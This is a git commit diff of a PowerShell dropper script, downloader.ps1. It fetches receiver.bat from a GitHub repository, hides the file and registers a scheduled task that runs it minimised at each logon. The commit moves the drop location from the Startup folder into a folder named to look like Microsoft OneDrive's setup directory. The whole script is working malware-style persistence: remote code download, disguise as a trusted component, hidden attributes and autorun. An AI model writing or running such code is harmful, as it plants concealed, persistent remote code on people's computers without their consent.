3cd4d4adbc868213ca588fc64171cebaa5b0133e
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-08-24 16:44:07 +0200

    Add files via upload

--- downloader.ps1
+++ downloader.ps1
@@ -1,11 +1,11 @@
 # Download the batch file
-Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat'))
+Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat'
 
 # Hide the batch file
-Set-ItemProperty -Path ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat')) -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 # Create the scheduled task action
-$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\Users\vikto\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat"""
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\ProgramData\Microsoft OneDrive\setup\receiver.bat"""
 
 # Create the scheduled task trigger
 $trigger = New-ScheduledTaskTrigger -AtLogon
